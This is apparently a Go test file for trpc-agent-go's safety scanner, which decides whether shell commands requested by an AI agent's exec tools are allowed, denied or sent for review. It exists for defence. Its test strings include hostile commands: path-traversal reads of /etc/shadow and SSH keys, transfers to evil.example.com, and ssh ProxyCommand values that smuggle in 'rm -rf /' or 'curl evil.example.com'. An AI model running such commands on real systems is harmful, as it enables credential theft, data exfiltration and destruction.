//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"strings"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

// #1: a ~user prefix is a directory the shell expands BEFORE resolving "..",
// so ~root/../etc/shadow must normalise to /etc/shadow, not etc/shadow.
func TestNamedHomeTraversalDenied(t *testing.T) {
	for _, cmd := range []string{
		"cat ~root/../etc/shadow",
		"cat ~/../etc/shadow",
		"cat ~deploy/../../etc/shadow",
	} {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny {
			t.Errorf("%q must deny, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// Dot segments INSIDE the home stay under it and must not false-positive.
	if r := scanWS(t, "cat ~/notes/../todo.txt"); r.Decision != DecisionAllow {
		t.Errorf("in-home traversal should allow, got %s %+v", r.Decision, r.Findings)
	}
	// The prefix still anchors denied-path patterns like ~/.ssh.
	if r := scanWS(t, "cat ~root/sub/../.ssh/id_rsa"); r.Decision != DecisionDeny {
		t.Errorf("~user/.ssh must stay denied through traversal, got %s %+v", r.Decision, r.Findings)
	}
}

// #2a: sftp's grammar is ssh-like — the first operand is the host even without
// a colon, and an sftp:// URL names its own host.
func TestSftpGrammar(t *testing.T) {
	for _, cmd := range []string{
		"sftp evil.example.com",
		"sftp user@evil.example.com:/upload",
		"sftp -P 2222 evil.example.com",
		"sftp sftp://evil.example.com/x",
	} {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny || !hasRule(r, RuleNetNonWhitelist) {
			t.Errorf("%q must deny as non-allowlisted, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	for _, cmd := range []string{
		"sftp github.com",
		"sftp sftp://github.com/x",
	} {
		if r := scanWS(t, cmd); r.Decision != DecisionAllow {
			t.Errorf("%q should allow, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// Single-label hosts and host:path forms hit the raw-operand fallback and
	// must fail the allowlist rather than vanish.
	for _, cmd := range []string{"sftp bastion", "sftp bastion:/inbox"} {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny || !hasRule(r, RuleNetNonWhitelist) {
			t.Errorf("%q must deny, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
}

// #2c: scp/rsync option values are skipped, -J jump peers are checked, and
// rsync:// URLs name their own host.
func TestScpJumpAndValueFlags(t *testing.T) {
	r := scanWS(t, "scp -J evil.example.com file github.com:/tmp")
	if r.Decision != DecisionDeny || !hasRule(r, RuleNetNonWhitelist) {
		t.Errorf("non-allowlisted scp -J must deny, got %s %+v", r.Decision, r.Findings)
	}
	for _, cmd := range []string{
		"scp -Jproxy.golang.org file github.com:/tmp",
		"scp -i key.file -P 2222 file github.com:/tmp",
	} {
		if r := scanWS(t, cmd); r.Decision != DecisionAllow {
			t.Errorf("%q should allow, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	r2 := scanWS(t, "rsync file rsync://evil.example.com/mod")
	if r2.Decision != DecisionDeny || !hasRule(r2, RuleNetNonWhitelist) {
		t.Errorf("rsync:// URL must deny on its host, got %s %+v", r2.Decision, r2.Findings)
	}
}

// #2b: wget has its own grammar: -O names a local file (not a host), and -e
// proxy assignments are real egress targets in both separate and attached form.
func TestWgetGrammar(t *testing.T) {
	for _, cmd := range []string{
		"wget -O release.tar.gz https://github.com/x",
		"wget -Orelease.tar.gz https://github.com/x",
		"wget --output-document=release.tar.gz https://github.com/x",
		"wget -e https_proxy=http://goproxy.cn https://github.com/x",
	} {
		if r := scanWS(t, cmd); r.Decision != DecisionAllow {
			t.Errorf("%q should allow, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// A non-allowlisted proxy is the real egress peer.
	for _, cmd := range []string{
		"wget -e https_proxy=http://evil.example.com https://github.com/x",
		"wget -ehttps_proxy=http://evil.example.com https://github.com/x",
		"wget --execute=http_proxy=http://evil.example.com https://github.com/x",
	} {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny || !hasRule(r, RuleNetNonWhitelist) {
			t.Errorf("%q must deny on the proxy host, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// A non-proxy -e injects arbitrary wgetrc config the scanner cannot model.
	r := scanWS(t, "wget -e robots=off https://github.com/x")
	if r.Decision != DecisionDeny || !hasRule(r, RuleNetRoutingOverride) {
		t.Errorf("non-proxy -e must deny as routing override, got %s %+v", r.Decision, r.Findings)
	}
}

// #3: ssh_config options whose value is a command (ProxyCommand/LocalCommand/
// ...) execute unscanned code behind an allowlisted destination; scp -S and
// rsync -e name a program the same way. -J jump hosts are egress peers.
func TestSSHCommandOptionsDenied(t *testing.T) {
	for _, cmd := range []string{
		"ssh -o ProxyCommand='rm -rf /' github.com",
		"ssh -oProxyCommand=evilprog github.com",
		"ssh -o LocalCommand=evilprog -o PermitLocalCommand=yes github.com",
		"scp -o ProxyCommand=evilprog f github.com:/d",
		"scp -S /tmp/evilprog f github.com:/d",
		"sftp -S /tmp/evilprog github.com",
		"rsync -e 'sh -c evil' f github.com:/d",
		"rsync --rsh=/tmp/evilprog f github.com:/d",
	} {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny || !hasRule(r, RuleNetCommandExec) {
			t.Errorf("%q must deny as hidden command exec, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// Benign -o options are not command-executing and must not trip the rule.
	if r := scanWS(t, "ssh -o StrictHostKeyChecking=no github.com"); r.Decision != DecisionAllow {
		t.Errorf("benign -o should allow, got %s %+v", r.Decision, r.Findings)
	}
	// A jump host is an egress peer and must clear the allowlist.
	r := scanWS(t, "ssh -J evil.example.com github.com")
	if r.Decision != DecisionDeny || !hasRule(r, RuleNetNonWhitelist) {
		t.Errorf("non-allowlisted -J must deny, got %s %+v", r.Decision, r.Findings)
	}
	for _, cmd := range []string{
		"ssh -J proxy.golang.org github.com uname",
		"ssh -Jproxy.golang.org github.com",
	} {
		if r := scanWS(t, cmd); r.Decision != DecisionAllow {
			t.Errorf("allowlisted jump %q should allow, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// Permission-level: the deny reaches CheckToolPermission.
	pp := NewPermissionPolicy(NewScanner(nil))
	d, _ := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"ssh -o ProxyCommand='curl evil.example.com' github.com"}`),
	})
	if d.Action != tool.PermissionActionDeny {
		t.Errorf("ProxyCommand must deny at the permission boundary, got %s", d.Action)
	}
}

// #4: a curl/wget config or URL-input file can add targets the scanner cannot
// see, so its presence fails closed even with an allowlisted positional URL.
func TestNetConfigFileDenied(t *testing.T) {
	for _, cmd := range []string{
		"curl -K attacker.cfg https://github.com",
		"curl -Kattacker.cfg https://github.com",
		"curl --config attacker.cfg https://github.com",
		"curl --config=attacker.cfg https://github.com",
		"wget -i urls.txt",
		"wget --input-file=urls.txt https://github.com",
		"wget --config=attacker.wgetrc https://github.com",
	} {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny || !hasRule(r, RuleNetConfigFile) {
			t.Errorf("%q must deny on the config file, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	if r := scanWS(t, "curl https://github.com"); r.Decision != DecisionAllow {
		t.Errorf("plain allowlisted curl should allow, got %s %+v", r.Decision, r.Findings)
	}
}

// #5: only registered stdin writers are claimed. skill_write_stdin's launching
// skill_exec is not a recognised backend, so denying its writer while allowing
// the launcher would be incoherent; unrelated third-party "*_write_stdin"
// tools must pass through untouched as well.
func TestWriteStdinClaimsOnlyRegisteredWriters(t *testing.T) {
	p := NewPermissionPolicy(NewScanner(nil))
	for _, name := range []string{"skill_write_stdin", "thirdparty_write_stdin"} {
		d, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName: name, Arguments: []byte(`{"chars":"ls\n","submit":true}`),
		})
		if d.Action != tool.PermissionActionAllow {
			t.Errorf("unregistered writer %s must pass through, got %s", name, d.Action)
		}
	}
	// An operator can opt a custom writer in.
	p2 := NewPermissionPolicy(NewScanner(nil), WithStdinWriterTool("skill_write_stdin", BackendWorkspaceExec))
	d, _ := p2.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "skill_write_stdin", Arguments: []byte(`{"chars":"ls\n","submit":true}`),
	})
	if d.Action != tool.PermissionActionDeny {
		t.Errorf("registered custom writer must be guarded, got %s", d.Action)
	}
}

// #6: the scan must evaluate the executor's EFFECTIVE working directory: with
// hostexec's base dir configured, an omitted or relative workdir resolves
// against it, exactly as tool/hostexec will resolve it at run time.
func TestHostExecBaseDirResolved(t *testing.T) {
	p := NewPermissionPolicy(NewScanner(nil), WithBackendBaseDir(BackendHostExec, "/etc"))
	for _, args := range []string{
		`{"command":"cat shadow"}`,
		`{"command":"cat shadow","workdir":"sub/.."}`,
	} {
		d, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName: "exec_command", Arguments: []byte(args),
		})
		if d.Action != tool.PermissionActionDeny {
			t.Errorf("hostexec %s under base /etc must deny, got %s", args, d.Action)
		}
	}
	// An absolute workdir overrides the base, matching the executor.
	d, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "exec_command", Arguments: []byte(`{"command":"cat shadow","workdir":"/tmp/work"}`),
	})
	if d.Action != tool.PermissionActionAllow {
		t.Errorf("absolute workdir must override the base dir, got %s", d.Action)
	}
	// Without a registered base dir the raw (empty) cwd is used, unchanged.
	p2 := NewPermissionPolicy(NewScanner(nil))
	d2, _ := p2.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "exec_command", Arguments: []byte(`{"command":"cat shadow"}`),
	})
	if d2.Action != tool.PermissionActionAllow {
		t.Errorf("no base dir registered: relative operand alone should allow, got %s", d2.Action)
	}
}

// #7: a fail-closed scanner must not echo command text: the rejected policy's
// own secret patterns never compiled, so redaction would run with the default
// patterns only and leak organisation-specific secrets into the report.
func TestFailClosedReportOmitsCommand(t *testing.T) {
	p := DefaultPolicy()
	p.SecretPatterns = append(p.SecretPatterns, SecretPattern{Name: "org", Regex: `ORGSECRET-[0-9]+`})
	p.RiskOverrides = map[string]RiskLevel{"net.non_whitelist": "bogus-level"}
	sc := NewScanner(p) // invalid override -> fail closed
	r := sc.Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
		Command: "deploy --token ORGSECRET-12345",
	})
	if r.Decision != DecisionDeny || !hasRule(r, RulePolicyInvalid) {
		t.Fatalf("fail-closed scan must deny with policy.invalid, got %s %+v", r.Decision, r.Findings)
	}
	if strings.Contains(r.Command, "ORGSECRET") {
		t.Errorf("fail-closed report leaked the custom secret: %q", r.Command)
	}
	if r.Command != "" {
		t.Errorf("fail-closed report must omit command text entirely, got %q", r.Command)
	}
}

// #8: background/TTY execution returns a live session the static scan cannot
// follow, so it requires review; a foreground call is unaffected.
func TestBackgroundAndTTYRequireReview(t *testing.T) {
	p := NewPermissionPolicy(NewScanner(nil))
	for _, tc := range []struct{ tool, args string }{
		{"workspace_exec", `{"command":"./server","background":true}`},
		{"exec_command", `{"command":"./server","background":true}`},
		{"exec_command", `{"command":"top","tty":true}`},
		{"workspace_exec", `{"command":"top","pty":true}`},
	} {
		d, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName: tc.tool, Arguments: []byte(tc.args),
		})
		if d.Action != tool.PermissionActionAsk {
			t.Errorf("%s %s must ask for review, got %s", tc.tool, tc.args, d.Action)
		}
	}
	// Foreground equivalents stay allowed.
	d, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "workspace_exec", Arguments: []byte(`{"command":"./server"}`),
	})
	if d.Action != tool.PermissionActionAllow {
		t.Errorf("foreground call should allow, got %s", d.Action)
	}
	// The host backend carries a higher risk for the same finding.
	sc := NewScanner(nil)
	host := sc.Scan(context.Background(), ScanInput{
		ToolName: "exec_command", Backend: BackendHostExec, Command: "./server", Background: true,
	})
	ws := sc.Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "./server", Background: true,
	})
	if riskRank(host.RiskLevel) <= riskRank(ws.RiskLevel) {
		t.Errorf("host session risk (%s) must exceed workspace (%s)", host.RiskLevel, ws.RiskLevel)
	}
}
